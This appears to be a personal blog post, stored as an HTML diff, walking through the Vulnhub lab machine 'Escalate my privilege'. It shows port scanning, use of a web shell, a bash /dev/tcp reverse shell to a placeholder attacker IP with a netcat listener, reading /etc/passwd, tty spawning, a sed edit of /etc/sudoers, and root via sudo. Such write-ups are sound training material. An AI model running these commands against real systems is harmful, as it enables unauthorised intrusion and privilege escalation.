@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>Blog</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+<link rel="stylesheet" href="blog_style.css">
+<style>
+       * {
+        font-family: Georgia, Cambria, "Times New Roman", Times, serif;
+      }
+      html, body {
+        margin: 0;
+        padding: 0;
+      }
+      h1 {
+        font-size: 50px;
+        margin-bottom: 17px;
+        color: #333;
+      }
+      h2 {
+        font-size: 24px;
+        line-height: 1.6;
+        margin: 30px 0 0 0;
+        margin-bottom: 18px;
+        margin-top: 33px;
+        color: #333;
+      }
+      h3 {
+        font-size: 30px;
+        margin: 10px 0 20px 0;
+        color: #333;
+      }
+      header {
+        width: 640px;
+        margin: auto;
+      }
+      section {
+        width: 640px;
+        margin: auto;
+      }
+      section p {
+        margin-bottom: 27px;
+        font-size: 20px;
+        line-height: 1.6;
+        color: #333;
+      }
+      section img {
+        max-width: 640px;
+      }
+      footer {
+        padding: 0 20px;
+        margin: 50px 0;
+        text-align: center;
+        font-size: 12px;
+      }
+      .aspectRatioPlaceholder {
+        max-width: auto !important;
+        max-height: auto !important;
+      }
+      .aspectRatioPlaceholder-fill {
+        padding-bottom: 0 !important;
+      }
+      header,
+      section[data-field=subtitle],
+      section[data-field=description] {
+        display: none;
+      }
+      pre {
+        display: block;
+        padding: 5px 5px 5px 5px;
+        background-color: #f7f7f7;
+        border: 2px solid #444444 ;
+        border-radius: 2px;
+        border-radius: 5px;
+        font-family: 'Courier New', Courier, monospace;
+        white-space: pre-wrap; /* Preserve line breaks and spaces */
+        line-height: 1.4;
+        overflow-x:
+      }
+
+      .pre--content {
+        display: block;
+        padding: 30px 30px 30px 30px;
+        background-color: #f7f7f7;
+        border: 2px solid #444444 ;
+        border-radius: 2px;
+        border-radius: 5px;
+        font-family: 'Courier New', Courier, monospace;
+        white-space: pre-wrap; /* Preserve line breaks and spaces */
+        line-height: 1.4;
+        overflow-x: auto; /* Allow horizontal scrolling if needed */
+    }
+</style>
+
+</head>
+<body>
+<!-- partial:index.partial.html -->
+<div class="top">
+  <div class="header">
+    <h1><span>Vulnhub:Escalate my privilege </span></h1>
+    <h2 class="author"><a href="#">By Romiyo <em></em> Karki</a></h2>
+ 
+</div>
+</div>
+<div class="content">
+
+<!-- Content-->
+<div class="begin">
+  <div class="date">
+    <span>Feb</span>
+    <span class="day">6</span></br>
+  </div>
+</br>
+</br>
+
+<h1 class="p-name">0x1:Vulnhub:Escalate my privilege</h1>
+</header>
+<section data-field="subtitle" class="p-summary">
+Exploiting readable credentials &amp; misconfiguration
+</section>
+<section data-field="body" class="e-content">
+<section name="1ace" class="section section--body section--first section--last"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="fc2a" id="fc2a" class="graf graf--h3 graf--leading graf--title">Vulnhub:Escalate my privilege</h3><p name="3d80" id="3d80" class="graf graf--p graf-after--h3">Exploiting readable credentials &amp; sudoers file misconfiguration</p><p name="2a7a" id="2a7a" class="graf graf--p graf--hasDropCapModel graf--hasDropCap graf-after--p"><span class="graf-dropCap">D</span>ifficulty : <strong class="markup--strong markup--p-strong"><em class="markup--em markup--p-em">Easy</em></strong></p><p name="3bfa" id="3bfa" class="graf graf--p graf-after--p">We are going to solve the vulnhub box named “Escalate my privilege” . Without wasting any time lets fire up this box .</p><blockquote name="c684" id="c684" class="graf graf--blockquote graf-after--p">PRO TIP: I advice you guys to run both attacking &amp; vulnerable machine in same Virtual Environment (VMware or VirtualBox) . I wasn&#39;t able to get reverse shell when i ran both 2 machines on two different virtual platform . (VM ware &amp; Virtual box).</blockquote><h3 name="5f3e" id="5f3e" class="graf graf--h3 graf-after--blockquote"><strong class="markup--strong markup--h3-strong">INITIAL RECON</strong></h3><p name="3f1a" id="3f1a" class="graf graf--p graf-after--h3">We can see the Ip address of the running machine when we boot it . So we can skip the part where we find the ip address of the vulnerable machine .</p><figure name="0d85" id="0d85" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*8jgwwMyh4oTHZokNXdTUtg.png" data-width="806" data-height="449" src="https://cdn-images-1.medium.com/max/800/1*8jgwwMyh4oTHZokNXdTUtg.png"><figcaption class="imageCaption">IP address of vulnerable machine</figcaption></figure><p name="1dd8" id="1dd8" class="graf graf--p graf-after--figure">If the Ip address of vulnerable machine wasn’t provided then we could simply run the host scan on the network .</p><pre name="ab3a" id="ab3a" class="graf graf--pre graf-after--p">nmap -sn &lt;IP/24&gt;</pre><p name="25b9" id="25b9" class="graf graf--p graf-after--pre">Nmap takes alot of time to perform aggressive scan so lets run the rustscan to find out which port is open in this machine quickly</p><pre name="ab1f" id="ab1f" class="graf graf--pre graf-after--p">rustscan -a &lt;IP adress&gt; </pre><figure name="9b2a" id="9b2a" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*6KFwc5epXNo5yjygXAk2_g.png" data-width="1428" data-height="424" src="https://cdn-images-1.medium.com/max/800/1*6KFwc5epXNo5yjygXAk2_g.png"></figure><blockquote name="4097" id="4097" class="graf graf--blockquote graf-after--figure">We can see that ssh,http and RPC port are open .</blockquote><p name="b7fd" id="b7fd" class="graf graf--p graf-after--blockquote">Let’s now run the Aggressive Scan on the vulnerable machine . It is easy machine so no any Firewall implemented . :) .</p><pre name="7bbb" id="7bbb" class="graf graf--pre graf-after--p">nmap -A &lt;IP of vulnerable machine&gt;</pre><figure name="83c5" id="83c5" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*qHNLWsQpeZIfRrN2XPmbGA.png" data-width="870" data-height="911" src="https://cdn-images-1.medium.com/max/800/1*qHNLWsQpeZIfRrN2XPmbGA.png"></figure><p name="41e9" id="41e9" class="graf graf--p graf-after--figure">Http service was running on port 80 so i quciky open my brower and loaded the site .</p><h3 name="7735" id="7735" class="graf graf--h3 graf-after--p"><strong class="markup--strong markup--h3-strong">GETTING WEB SHELL</strong></h3><p name="038e" id="038e" class="graf graf--p graf-after--h3">There is a static page with full background image which alt attribute value phpbash.php . I have never seen where img alt attribute was php file .</p><figure name="b15e" id="b15e" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*upNawRJFbkOyAgD0YcYeSA.png" data-width="1869" data-height="367" data-is-featured="true" src="https://cdn-images-1.medium.com/max/800/1*upNawRJFbkOyAgD0YcYeSA.png"></figure><p name="d731" id="d731" class="graf graf--p graf-after--figure">I went to /phpbash.php file . I found a web shell there fully interactive running as apache user . Wow</p><figure name="979e" id="979e" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*5qteZAyqgiJqIKHk-KTzlw.png" data-width="1920" data-height="238" src="https://cdn-images-1.medium.com/max/800/1*5qteZAyqgiJqIKHk-KTzlw.png"></figure><h3 name="4588" id="4588" class="graf graf--h3 graf-after--figure"><strong class="markup--strong markup--h3-strong">GETTING REVERSE SHELL</strong></h3><p name="f44a" id="f44a" class="graf graf--p graf-after--h3">Web Shell are cool but Reverse shell are even more cooler . To get the reverse shell into this machine i used the tcp bash reverse shell payload .</p><p name="0053" id="0053" class="graf graf--p graf-after--p">So i started listener on my parrot machine with netcat by:</p><pre name="3e99" id="3e99" class="graf graf--pre graf-after--p">nc -lvnp 4444 </pre><figure name="b900" id="b900" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*a4dyOtH76NcRLNPh-15W5g.png" data-width="597" data-height="137" src="https://cdn-images-1.medium.com/max/800/1*a4dyOtH76NcRLNPh-15W5g.png"></figure><p name="f5e0" id="f5e0" class="graf graf--p graf-after--figure">And on web shell i ran :</p><pre name="ad14" id="ad14" class="graf graf--pre graf-after--p">bash -i &gt;&amp; /dev/tcp/&lt;IP of attacker machine&gt;/&lt;POrt listening&gt; 0&gt;&amp;1</pre><figure name="0b15" id="0b15" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*5KPrn1OVQdVAvT9NY-H9RA.png" data-width="742" data-height="215" src="https://cdn-images-1.medium.com/max/800/1*5KPrn1OVQdVAvT9NY-H9RA.png"></figure><p name="97f6" id="97f6" class="graf graf--p graf-after--figure">Yay got the reverse shell .</p><figure name="f992" id="f992" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*i6VpDicob9nfMBC-n0nnWA.png" data-width="1920" data-height="238" src="https://cdn-images-1.medium.com/max/800/1*i6VpDicob9nfMBC-n0nnWA.png"></figure><h3 name="9826" id="9826" class="graf graf--h3 graf-after--figure"><strong class="markup--strong markup--h3-strong">Privilege escalation</strong></h3><p name="ec13" id="ec13" class="graf graf--p graf-after--h3">I quickly checked out the /etc/passwd file to check out other users with /bin/bash as default shell .</p><pre name="b9f7" id="b9f7" class="graf graf--pre graf-after--p">cat /etc/passwd | grep “/bin/bash” </pre><figure name="ea69" id="ea69" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*UWScjgkStbv3MCMHhohyoQ.png" data-width="555" data-height="142" src="https://cdn-images-1.medium.com/max/800/1*UWScjgkStbv3MCMHhohyoQ.png"></figure><p name="6796" id="6796" class="graf graf--p graf-after--figure">We can see that there is another user with username “armour” . After a little bit of searching for any misconfiguration and readable file i found a file with credentials in /home directory .</p><figure name="9349" id="9349" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*lNMieFrMbLpgmDamXGwJyQ.png" data-width="710" data-height="199" src="https://cdn-images-1.medium.com/max/800/1*lNMieFrMbLpgmDamXGwJyQ.png"></figure><blockquote name="b6d5" id="b6d5" class="graf graf--blockquote graf-after--figure">LESSON1: Never store your credential&#39;s in directory readable by other.</blockquote><p name="b263" id="b263" class="graf graf--p graf-after--blockquote">File says md5(rootroot1) is my password . So i quickly converted the rootroot1 to md5 hash value .</p><figure name="62b5" id="62b5" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*H6dVB1Z0IzP6iaSVkkngBQ.png" data-width="923" data-height="659" src="https://cdn-images-1.medium.com/max/800/1*H6dVB1Z0IzP6iaSVkkngBQ.png"></figure><h3 name="d181" id="d181" class="graf graf--h3 graf-after--figure"><strong class="markup--strong markup--h3-strong">SPOILER ALET:</strong></h3><p name="2fac" id="2fac" class="graf graf--p graf-after--h3">I thought that it was root password although it was on /home/armour directory .I ran the command</p><pre name="d5a4" id="d5a4" class="graf graf--pre graf-after--p">su root </pre><p name="058a" id="058a" class="graf graf--p graf-after--pre">with the md5 hash password . But it didn&#39;t worked so i supplied the “rootroot1” as password .</p><blockquote name="4d9d" id="4d9d" class="graf graf--blockquote graf-after--p">It WORKED ! I got root but that’s not the intended way to get root in this box .</blockquote><p name="4734" id="4734" class="graf graf--p graf-after--blockquote"><em class="markup--em markup--p-em">Back to the intended way:</em></p><p name="d7cd" id="d7cd" class="graf graf--p graf-after--p">I figured out that it was armour’s password so</p><pre name="5318" id="5318" class="graf graf--pre graf-after--p">su armour -&gt; password is MD5(rootroot1)</pre><p name="640f" id="640f" class="graf graf--p graf-after--pre">Yes , Got into the armour’s account .</p><figure name="dbfa" id="dbfa" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*6aGtBDekdFXPqU8TqdTgFw.png" data-width="719" data-height="177" src="https://cdn-images-1.medium.com/max/800/1*6aGtBDekdFXPqU8TqdTgFw.png"></figure><h3 name="4509" id="4509" class="graf graf--h3 graf-after--figure"><strong class="markup--strong markup--h3-strong">GETTING TTY SHELL</strong></h3><p name="96ef" id="96ef" class="graf graf--p graf-after--h3">I tried to find juicy files which can lead me to root but found none . I ran the command to list all the command that i can run as sudo permission .</p><pre name="b42d" id="b42d" class="graf graf--pre graf-after--p">sudo -l </pre><figure name="6408" id="6408" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*AyebdRpKaDmV_4J-7IK-aQ.png" data-width="712" data-height="299" src="https://cdn-images-1.medium.com/max/800/1*AyebdRpKaDmV_4J-7IK-aQ.png"></figure><p name="a95a" id="a95a" class="graf graf--p graf-after--figure">Got an error ! Saying we must have tty to run sudo command .</p><p name="1180" id="1180" class="graf graf--p graf-after--p">After a little bit of searching about this error i found cool article. It looks like we “Defaults requiretty” security setting was written in /etc/sudoers which allows only tty shell to run sudo command</p><p name="6d4b" id="6d4b" class="graf graf--p graf-after--p"><a href="https://www.shell-tips.com/linux/sudo-sorry-you-must-have-a-tty-to-run-sudo/#gsc.tab=0" data-href="https://www.shell-tips.com/linux/sudo-sorry-you-must-have-a-tty-to-run-sudo/#gsc.tab=0" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">sudo: sorry, you must have a tty to run sudo (shell-tips.com)</a></p><p name="e4f4" id="e4f4" class="graf graf--p graf-after--p">So , I tried to spawn a tty shell using python with:</p><pre name="0719" id="0719" class="graf graf--pre graf-after--p">python -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</pre><p name="2e7d" id="2e7d" class="graf graf--p graf-after--pre">But got error ! It looks like we cant spawn tty shell using python2 in this box . So i run the command :</p><figure name="7228" id="7228" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*FLmKLyyQZgqBsWYGChGNoA.png" data-width="724" data-height="343" src="https://cdn-images-1.medium.com/max/800/1*FLmKLyyQZgqBsWYGChGNoA.png"></figure><pre name="e549" id="e549" class="graf graf--pre graf-after--figure">which python3 </pre><p name="8c5e" id="8c5e" class="graf graf--p graf-after--pre">Luckily, Python3 was install in this machine . So i used the python3 to spawn tty shell .</p><pre name="0c8c" id="0c8c" class="graf graf--pre graf-after--p">python3 -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</pre><figure name="cf13" id="cf13" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*peShjv4y6Pxy4PxXguJ18g.png" data-width="897" data-height="293" src="https://cdn-images-1.medium.com/max/800/1*peShjv4y6Pxy4PxXguJ18g.png"></figure><p name="093d" id="093d" class="graf graf--p graf-after--figure">Yah got the tty shell .</p><h3 name="f921" id="f921" class="graf graf--h3 graf-after--p">ANOTHER METHOD TO GET TTY :</h3><p name="d9f7" id="d9f7" class="graf graf--p graf-after--h3">When discussing with my friend X90 . He found that /etc/sudoers was also writable using sed command through which we can replace</p><pre name="0dc9" id="0dc9" class="graf graf--pre graf-after--p">Defaults requiretty to #Defaults requiretty</pre><p name="e111" id="e111" class="graf graf--p graf-after--pre">which solves the problem of tty .It would be handy if python3 wasn&#39;t installed on that machine .</p><p name="42d0" id="42d0" class="graf graf--p graf-after--p">Payload to replace:</p><pre name="2aa3" id="2aa3" class="graf graf--pre graf-after--p">sed  -i &#39;s/Defaults    requiretty/#Defaults    requiretty/g&#39; /etc/sudoers</pre><h3 name="0ff3" id="0ff3" class="graf graf--h3 graf-after--pre">GETTING ROOT SHELL</h3><p name="8c95" id="8c95" class="graf graf--p graf-after--h3">Got the tty lets run the command now :</p><figure name="12ce" id="12ce" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*-ZGLxbP7c5HdAR5KRR1rkQ.png" data-width="809" data-height="965" src="https://cdn-images-1.medium.com/max/800/1*-ZGLxbP7c5HdAR5KRR1rkQ.png"></figure><p name="636b" id="636b" class="graf graf--p graf-after--figure">sudo /bin/bash command can we executed without any password. Looks like an root privilege escalation to me . I ran the command</p><pre name="121b" id="121b" class="graf graf--pre graf-after--p">sudo /bin/bash </pre><figure name="9b04" id="9b04" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*XQWaRYOBhIQ9vOA1zham-g.png" data-width="1115" data-height="557" src="https://cdn-images-1.medium.com/max/800/1*XQWaRYOBhIQ9vOA1zham-g.png"></figure><p name="47a5" id="47a5" class="graf graf--p graf-after--figure">Got an easy root ! Lets find our flag .</p><pre name="5668" id="5668" class="graf graf--pre graf-after--p">cd /root <br>cat proof.txt </pre><figure name="751e" id="751e" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*ySNbOOaGGtCixSMQiFLQrw.png" data-width="1046" data-height="215" src="https://cdn-images-1.medium.com/max/800/1*ySNbOOaGGtCixSMQiFLQrw.png"></figure><h3 name="b583" id="b583" class="graf graf--h3 graf-after--figure">Conclusion:</h3><p name="e8d1" id="e8d1" class="graf graf--p graf-after--h3">Thank you for staying till end of this blog .From this box i was able to learn more about sudoers files and tty shell .</p><p name="bcd4" id="bcd4" class="graf graf--p graf-after--p">If you guys like content related to cyber security &amp; CTF then you guys can watch me on Youtube (<a href="https://www.youtube.com/channel/UCObYFLII6Oh4stffF8deFwg/featured" data-href="https://www.youtube.com/channel/UCObYFLII6Oh4stffF8deFwg/featured" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">Dr_Tomato — YouTube</a>)</p><p name="bfda" id="bfda" class="graf graf--p graf-after--p">Follow me on Twitter. (<a href="https://twitter.com/Dr_Tomato1337" data-href="https://twitter.com/Dr_Tomato1337" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">Dr_Tomato (@Dr_Tomato1337) / Twitter</a>)</p><p name="941e" id="941e" class="graf graf--p graf-after--p graf--trailing">See you guys on another blog , Till now Signing Out , Dr_Tomato.</p></div></div></section>
+
+<div class="prev"><a href="#">Prev</a></div>
+<div class="next"><a href="#">Next</a></div>
+
+<div class="footer">
+  <span class="copy">&copy; Romiyo karki</span>
+  </div>
+<!-- partial -->
+  
+</body>
+</html>
